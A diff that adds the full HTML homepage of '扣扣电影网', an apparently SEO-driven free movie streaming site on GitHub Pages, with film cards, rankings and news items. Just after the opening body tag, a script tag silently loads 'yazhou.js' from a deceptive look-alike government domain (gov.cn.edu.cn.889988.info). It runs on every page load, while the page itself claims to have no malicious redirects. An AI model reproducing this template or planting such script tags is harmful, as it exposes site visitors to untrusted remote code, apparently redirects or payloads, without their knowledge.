@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="扣扣电影网是专注于高清影视在线观赏的优质平台，汇集院线大片、经典老片、热播剧集、动漫综艺与纪录片，提供免费流畅的播放体验。访问 koukoudianyingwang-app.github.io 获取最新影视资源、排行榜单与观影指南。">
+<meta name="keywords" content="扣扣电影网, koukoudianyingwang, 高清电影, 在线电影, 免费影视, 院线大片, 经典电影, 热播剧集, 动漫综艺, 纪录片, 电影排行, 观影指南, koukoudianyingwang-app.github.io">
+<meta name="author" content="扣扣电影网">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0b1020">
+<meta name="application-name" content="扣扣电影网">
+<title>扣扣电影网 - 高清影视在线观看首选平台 | koukoudianyingwang-app.github.io</title>
+<link rel="canonical" href="https://koukoudianyingwang-app.github.io/">
+<style>
+:root{
+  --bg-deep:#070a16;
+  --bg-card:#0f1428;
+  --line:rgba(255,255,255,.08);
+  --txt:#eef1f8;
+  --txt-dim:#a8b0c4;
+  --accent:#ff5b5b;
+  --accent2:#3d7bff;
+  --gold:#ffc35b;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg-deep);
+  color:var(--txt);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* 顶部导航 */
+.nav{
+  position:sticky;top:0;z-index:99;
+  background:rgba(7,10,22,.86);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{display:flex;align-items:center;gap:14px;height:58px}
+.logo{font-size:20px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.logo b{color:var(--accent)}
+.logo span{font-size:11px;color:var(--txt-dim);font-weight:400;margin-left:6px}
+.menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.menu a{
+  font-size:14px;padding:7px 12px;border-radius:8px;color:var(--txt-dim);
+  transition:.2s;white-space:nowrap;
+}
+.menu a:hover{color:#fff;background:rgba(255,255,255,.06)}
+
+/* 首屏 */
+.hero{
+  position:relative;
+  padding:64px 0 54px;
+  background:
+    radial-gradient(1200px 400px at 80% -10%,rgba(255,91,91,.22),transparent 60%),
+    radial-gradient(900px 360px at 0% 10%,rgba(61,123,255,.18),transparent 55%);
+  border-bottom:1px solid var(--line);
+}
+.hero-grid{display:grid;grid-template-columns:1.25fr .75fr;gap:40px;align-items:center}
+.kicker{
+  display:inline-block;font-size:12px;letter-spacing:2px;
+  color:var(--gold);border:1px solid rgba(255,195,91,.35);
+  padding:5px 12px;border-radius:20px;margin-bottom:16px;
+}
+.hero h1{font-size:42px;line-height:1.2;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{color:var(--txt-dim);margin-top:14px;font-size:16px;max-width:560px}
+.cta{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 26px;border-radius:12px;font-weight:700;font-size:15px;
+  transition:.2s;
+}
+.btn-main{background:var(--accent);color:#fff}
+.btn-main:hover{filter:brightness(1.12);transform:translateY(-2px)}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{background:rgba(255,255,255,.06)}
+.hero-stat{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.hero-stat div{
+  background:var(--bg-card);border:1px solid var(--line);
+  border-radius:14px;padding:18px 14px;text-align:center;
+}
+.hero-stat strong{display:block;font-size:26px;color:var(--gold)}
+.hero-stat small{color:var(--txt-dim);font-size:12px}
+
+/* 通用栏目 */
+.sec{padding:56px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:26px;font-weight:800}
+.sec-head h2 i{font-style:normal;color:var(--accent2)}
+.sec-head .more{font-size:13px;color:var(--txt-dim);border:1px solid var(--line);padding:6px 14px;border-radius:20px}
+.tagline{color:var(--txt-dim);font-size:14px;max-width:640px;margin-top:6px}
+
+/* 卡片 */
+.grid{display:grid;gap:18px}
+.grid-4{grid-template-columns:repeat(4,1fr)}
+.grid-3{grid-template-columns:repeat(3,1fr)}
+.grid-2{grid-template-columns:repeat(2,1fr)}
+.card{
+  background:var(--bg-card);border:1px solid var(--line);
+  border-radius:14px;overflow:hidden;transition:.25s;
+  display:flex;flex-direction:column;
+}
+.card:hover{transform:translateY(-5px);border-color:rgba(255,91,91,.45);box-shadow:0 18px 40px rgba(0,0,0,.45)}
+.thumb{position:relative;aspect-ratio:3/4;background:linear-gradient(135deg,#1a2240,#0c1020)}
+.thumb::after{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(circle at 30% 25%,rgba(255,255,255,.10),transparent 40%),
+    repeating-linear-gradient(45deg,transparent 0 12px,rgba(255,255,255,.03) 12px 24px);
+}
+.thumb .no{position:absolute;left:10px;top:10px;background:rgba(0,0,0,.6);color:#fff;font-size:12px;padding:3px 9px;border-radius:6px;z-index:2}
+.thumb .rate{position:absolute;right:10px;top:10px;background:var(--gold);color:#1a1400;font-weight:800;font-size:12px;padding:3px 9px;border-radius:6px;z-index:2}
+.card-body{padding:14px;flex:1;display:flex;flex-direction:column;gap:8px}
+.card-body h3{font-size:15px;font-weight:700;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.card-body .meta{font-size:12px;color:var(--txt-dim);display:flex;gap:8px;flex-wrap:wrap}
+.card-body .meta b{color:var(--accent2);font-weight:600}
+.card-body p{font-size:13px;color:var(--txt-dim);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* 排行 */
+.rank{display:flex;flex-direction:column;gap:12px}
+.rank-item{
+  display:flex;align-items:center;gap:14px;
+  background:var(--bg-card);border:1px solid var(--line);
+  border-radius:12px;padding:12px;transition:.2s;
+}
+.rank-item:hover{background:rgba(255,91,91,.08);border-color:rgba(255,91,91,.4)}
+.rank-num{font-size:24px;font-weight:900;color:rgba(255,255,255,.18);min-width:38px}
+.rank-item:nth-child(1) .rank-num{color:var(--gold)}
+.rank-item:nth-child(2) .rank-num{color:var(--txt-dim)}
+.rank-item:nth-child(3) .rank-num{color:#cd7f5b}
+.rank-txt h4{font-size:15px;font-weight:700}
+.rank-txt small{color:var(--txt-dim);font-size:12px}
+.rank-bar{margin-top:7px;height:4px;border-radius:4px;background:rgba(255,255,255,.08);overflow:hidden}
+.rank-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:4px}
+
+/* 资讯 */
+.news-item{
+  display:grid;grid-template-columns:120px 1fr;gap:16px;
+  padding:16px 0;border-bottom:1px dashed var(--line);
+}
+.news-item:last-child{border-bottom:0}
+.news-day{font-size:13px;color:var(--accent);font-weight:700}
+.news-day s{display:block;text-decoration:none;color:var(--txt-dim);font-weight:400;font-size:12px}
+.news-item h4{font-size:16px;font-weight:700;margin-bottom:6px}
+.news-item p{font-size:13px;color:var(--txt-dim)}
+
+/* 关于 */
+.about{
+  background:linear-gradient(160deg,#0f1428,#070a16);
+  border-top:1px solid var(--line);
+}
+.feat{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.feat div{
+  background:rgba(255,255,255,.03);border:1px solid var(--line);
+  border-radius:14px;padding:22px 18px;
+}
+.feat h4{font-size:15px;margin:10px 0 6px}
+.feat p{font-size:13px;color:var(--txt-dim)}
+.feat .ic{font-size:26px}
+
+/* 页脚 */
+.foot{
+  border-top:1px solid var(--line);padding:40px 0 26px;
+  background:#050712;
+}
+.foot-grid{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:28px}
+.foot h5{font-size:15px;margin-bottom:12px;color:#fff}
+.foot ul{list-style:none;display:flex;flex-direction:column;gap:8px}
+.foot a{font-size:13px;color:var(--txt-dim)}
+.foot a:hover{color:var(--accent)}
+.copy{margin-top:28px;padding-top:18px;border-top:1px solid var(--line);font-size:12px;color:#6d7690;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.copy b{color:var(--accent)}
+
+/* 响应式 */
+@media(max-width:900px){
+  .hero-grid{grid-template-columns:1fr}
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .grid-3,.feat{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:600px){
+  .wrap{padding:0 14px}
+  .nav-in{height:52px}
+  .logo{font-size:17px}
+  .menu a{padding:6px 9px;font-size:13px}
+  .hero{padding:38px 0 34px}
+  .hero h1{font-size:29px}
+  .hero-stat{grid-template-columns:repeat(3,1fr);gap:8px}
+  .hero-stat div{padding:12px 6px}
+  .hero-stat strong{font-size:19px}
+  .sec{padding:38px 0}
+  .sec-head h2{font-size:21px}
+  .grid-4,.grid-3,.grid-2,.feat{grid-template-columns:repeat(2,1fr);gap:12px}
+  .news-item{grid-template-columns:1fr;gap:6px}
+  .foot-grid{grid-template-columns:1fr}
+}
+@media(max-width:380px){
+  .grid-4,.grid-3,.grid-2,.feat{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="nav">
+  <div class="wrap nav-in">
+    <a class="logo" href="#top">扣扣<span>电影网</span></a>
+    <nav class="menu">
+      <a href="#hot">热映推荐</a>
+      <a href="#types">影片分类</a>
+      <a href="#rank">人气排行</a>
+      <a href="#news">影讯资讯</a>
+      <a href="#about">平台介绍</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="top">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="kicker">KK MOVIE · 高清影视在线平台</span>
+      <h1>扣扣电影网 · 把<em>电影院</em>装进口袋</h1>
+      <p>扣扣电影网（koukoudianyingwang）致力于为影迷提供高清、流畅、免费的影视在线观看服务。从最新院线大片到难以寻觅的经典老片，从热播剧集到高分纪录片，一网打尽。官方站点：<strong>https://koukoudianyingwang-app.github.io</strong>，随时随地，想看就看。</p>
+      <div class="cta">
+        <a class="btn btn-main" href="#hot">立即观影 →</a>
+        <a class="btn btn-ghost" href="#rank">查看排行榜</a>
+      </div>
+    </div>
+    <div class="hero-stat">
+      <div><strong>2.6万+</strong><small>影视资源</small></div>
+      <div><strong>1080P</strong><small>高清画质</small></div>
+      <div><strong>0 广告</strong><small>清爽体验</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="hot">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>热映<i>推荐</i></h2>
+        <p class="tagline">编辑团队每日精选，覆盖动作、爱情、科幻、悬疑等多种类型，紧跟院线与流媒体更新节奏。</p>
+      </div>
+      <a class="more" href="#">查看更多</a>
+    </div>
+    <div class="grid grid-4">
+      <article class="card">
+        <div class="thumb"><span class="no">TOP 1</span><span class="rate">9.2</span></div>
+        <div class="card-body">
+          <h3>边境猎手：黎明行动</h3>
+          <div class="meta"><b>动作 / 犯罪</b><span>2026</span><span>128 分钟</span></div>
+          <p>退役特种兵被卷入跨国走私案，孤身穿越边境线，在黎明前的黑夜完成绝地反击。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><span class="no">TOP 2</span><span class="rate">8.7</span></div>
+        <div class="card-body">
+          <h3>海风吹过七月</h3>
+          <div class="meta"><b>爱情 / 剧情</b><span>2026</span><span>106 分钟</span></div>
+          <p>一场发生在南方小岛的夏日邂逅，关于遗憾、成长与重新出发的温柔故事。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><span class="no">TOP 3</span><span class="rate">8.9</span></div>
+        <div class="card-body">
+          <h3>时间褶皱</h3>
+          <div class="meta"><b>科幻 / 悬疑</b><span>2025</span><span>142 分钟</span></div>
+          <p>当时间不再线性流动，一位物理学家必须在记忆消散前，找出裂缝的源头。</p>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb"><span class="no">TOP 4</span><span class="rate">8.4</span></div>
+        <div class="card-body">
+          <h3>灶台上的家</h3>
+          <div class="meta"><b>家庭 / 纪录片</b><span>2025</span><span>96 分钟</span></div>
+          <p>镜头对准三代同堂的厨房，用一蔬一饭记录中国家庭的情感与变迁。</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="types" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>影片<i>分类</i></h2>
+        <p class="tagline">按类型找片更高效。扣扣电影网对资源进行多维度标签化整理，让每一次选择都不将就。</p>
+      </div>
+      <a class="more" href="#">全部分类</a>
+    </div>
+    <div class="grid grid-3">
+      <div class="card">
+        <div class="card-body">
+          <h3>🎬 院线大片</h3>
+          <p>同步更新国内外院线热映作品，动作、视效、巨制大片一网打尽，足不出户享受影院级画质。</p>
+          <div class="meta"><span>共 3862 部</span><a href="#">进入频道 →</a></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <h3>📺 热播剧集</h3>
+          <p>国产剧、美剧、韩剧、日剧持续追更，悬疑、职场、古装、甜宠，总有一部让你熬夜追完。</p>
+          <div class="meta"><span>共 5210 部</span><a href="#">进入频道 →</a></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <h3>🎨 动漫综艺</h3>
+          <p>热血番、治愈番、国产动画与综艺真人秀，轻松解压，老少皆宜的休闲之选。</p>
+          <div class="meta"><span>共 2740 部</span><a href="#">进入频道 →</a></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <h3>🏆 经典老片</h3>
+          <p>华语影史经典、世界电影百年佳作，4K 修复版重温光影黄金时代。</p>
+          <div class="meta"><span>共 6130 部</span><a href="#">进入频道 →</a></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <h3>🌍 纪录片</h3>
+          <p>自然地理、人文历史、社会纪实，用真实的力量拓宽视野与认知边界。</p>
+          <div class="meta"><span>共 1580 部</span><a href="#">进入频道 →</a></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <h3>🎭 短片实验</h3>
+          <p>独立导演、学生作品与先锋影像，十分钟看见一个世界的另一种可能。</p>
+          <div class="meta"><span>共 920 部</span><a href="#">进入频道 →</a></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="rank" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>人气<i>排行</i></h2>
+        <p class="tagline">基于真实播放与互动数据生成，每小时更新，看见大家正在追什么。</p>
+      </div>
+      <a class="more" href="#">周榜 / 月榜</a>
+    </div>
+    <div class="grid grid-2">
+      <div class="rank">
+        <div class="rank-item"><span class="rank-num">01</span><div class="rank-txt"><h4>边境猎手：黎明行动</h4><small>动作 · 2026 · 播放 128 万</small><div class="rank-bar"><i style="width:96%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">02</span><div class="rank-txt"><h4>沉默的证人</h4><small>悬疑 · 2025 · 播放 96 万</small><div class="rank-bar"><i style="width:78%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">03</span><div class="rank-txt"><h4>时间褶皱</h4><small>科幻 · 2025 · 播放 81 万</small><div class="rank-bar"><i style="width:66%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">04</span><div class="rank-txt"><h4>海风吹过七月</h4><small>爱情 · 2026 · 播放 64 万</small><div class="rank-bar"><i style="width:52%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">05</span><div class="rank-txt"><h4>灶台上的家</h4><small>纪录片 · 2025 · 播放 47 万</small><div class="rank-bar"><i style="width:40%"></i></div></div></div>
+      </div>
+      <div class="rank">
+        <div class="rank-item"><span class="rank-num">06</span><div class="rank-txt"><h4>长安十二时辰·前传</h4><small>古装 · 2026 · 播放 39 万</small><div class="rank-bar"><i style="width:34%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">07</span><div class="rank-txt"><h4>深海来信</h4><small>动画 · 2025 · 播放 33 万</small><div class="rank-bar"><i style="width:29%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">08</span><div class="rank-txt"><h4>城市折叠</h4><small>剧情 · 2024 · 播放 27 万</small><div class="rank-bar"><i style="width:24%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">09</span><div class="rank-txt"><h4>极速心跳</h4><small>运动 · 2026 · 播放 21 万</small><div class="rank-bar"><i style="width:19%"></i></div></div></div>
+        <div class="rank-item"><span class="rank-num">10</span><div class="rank-txt"><h4>夜航西飞</h4><small>冒险 · 2025 · 播放 16 万</small><div class="rank-bar"><i style="width:15%"></i></div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="news" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>影讯<i>资讯</i></h2>
+        <p class="tagline">电影新闻、上映档期、导演访谈与观影指南，帮你决定下一部看什么。</p>
+      </div>
+      <a class="more" href="#">资讯首页</a>
+    </div>
+    <div class="grid grid-2">
+      <a class="news-item" href="#"><div class="news-day">10-07<s>2026</s></div><div><h4>国庆档收官：现实主义题材连续三年领跑票房</h4><p>今年国庆档总票房突破 42 亿元，其中现实主义剧情片占比显著提升，观众口味正在悄然变化。</p></div></a>
+      <a class="news-item" href="#"><div class="news-day">10-05<s>2026</s></div><div><h4>4K 修复计划启动：百部华语经典将重返大银幕</h4><p>中国电影资料馆联合多家机构，将对《霸王别姬》《活着》等百余部经典完成 4K 数字化修复。</p></div></a>
+      <a class="news-item" href="#"><div class="news-day">10-02<s>2026</s></div><div><h4>观影指南：十月不容错过的 8 部新片</h4><p>从科幻巨制到文艺小品，我们为你精选了整个十月最值得走进电影院的八部作品。</p></div></a>
+      <a class="news-item" href="#"><div class="news-day">09-28<s>2026</s></div><div><h4>流媒体战争进入下半场：自制内容成核心竞争力</h4><p>随着版权成本攀升，各大平台纷纷加码自制剧集与纪录片，内容质量成为留存关键。</p></div></a>
+      <a class="news-item" href="#"><div class="news-day">09-24<s>2026</s></div><div><h4>专访《时间褶皱》导演：我们如何"拍摄"时间</h4><p>一部没有绿幕的科幻片，靠灯光、镜头与声音设计制造出时间错位的眩晕感。</p></div></a>
+      <a class="news-item" href="#"><div class="news-day">09-20<s>2026</s></div><div><h4>家庭观影趋势报告：合家欢动画重回周末档 C 位</h4><p>数据显示，周末上午场动画电影上座率同比提升 23%，"带孩子看电影"成为新刚需。</p></div></a>
+    </div>
+  </div>
+</section>
+
+<section class="sec about" id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <h2>关于<i>扣扣电影网</i></h2>
+        <p class="tagline">一个由影迷为影迷搭建的影视导航与观赏平台，坚持简洁、快速、无干扰。</p>
+      </div>
+    </div>
+    <div class="feat">
+      <div><span class="ic">🎞️</span><h4>资源丰富</h4><p>涵盖电影、剧集、动漫、综艺、纪录片，新旧兼顾，分类清晰。</p></div>
+      <div><span class="ic">⚡</span><h4>极速加载</h4><p>采用轻量前端架构，弱网与移动端也能秒开页面，流畅播放。</p></div>
+      <div><span class="ic">📱</span><h4>多端适配</h4><p>手机、平板、电脑自动适配排版，横竖屏切换自如。</p></div>
+      <div><span class="ic">🛡️</span><h4>清爽安全</h4><p>无弹窗、无捆绑、无恶意跳转，专注观影本身。</p></div>
+    </div>
+    <div style="margin-top:26px;background:rgba(255,255,255,.03);border:1px solid var(--line);border-radius:14px;padding:22px">
+      <h3 style="font-size:18px;margin-bottom:10px">如何使用扣扣电影网</h3>
+      <p style="color:var(--txt-dim);font-size:14px">访问官方网址 <strong style="color:var(--gold)">https://koukoudianyingwang-app.github.io</strong>，在首页顶部导航选择感兴趣的栏目：<b>热映推荐</b>查看编辑精选，<b>影片分类</b>按类型找片，<b>人气排行</b>跟风追热点，<b>影讯资讯</b>获取档期与观影建议。所有内页链接均以锚点（#）形式组织在同一页面内，加载更快、跳转更稳。扣扣电影网持续更新影视资源与榜单数据，建议收藏网址，随时回来发现好片。</p>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <a class="logo" href="#top">扣扣<span>电影网</span></a>
+        <p style="color:var(--txt-dim);font-size:13px;margin-top:12px;max-width:300px">扣扣电影网（koukoudianyingwang）—— 高清影视在线观看平台，让好电影被发现。</p>
+        <p style="color:var(--txt-dim);font-size:13px;margin-top:10px">官方网址：<strong style="color:var(--accent)">https://koukoudianyingwang-app.github.io</strong></p>
+      </div>
+      <div>
+        <h5>快速导航</h5>
+        <ul>
+          <li><a href="#hot">热映推荐</a></li>
+          <li><a href="#types">影片分类</a></li>
+          <li><a href="#rank">人气排行</a></li>
+          <li><a href="#news">影讯资讯</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>影片类型</h5>
+        <ul>
+          <li><a href="#">动作冒险</a></li>
+          <li><a href="#">爱情喜剧</a></li>
+          <li><a href="#">科幻悬疑</a></li>
+          <li><a href="#">纪录片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>帮助与支持</h5>
+        <ul>
+          <li><a href="#">观影指南</a></li>
+          <li><a href="#">常见问题</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">关于我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <span id="yr">2026</span> 扣扣电影网 koukoudianyingwang · 保留所有权利 · 本站仅为影视信息导航平台</span>
+      <span>站点地址：<b>https://koukoudianyingwang-app.github.io</b></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
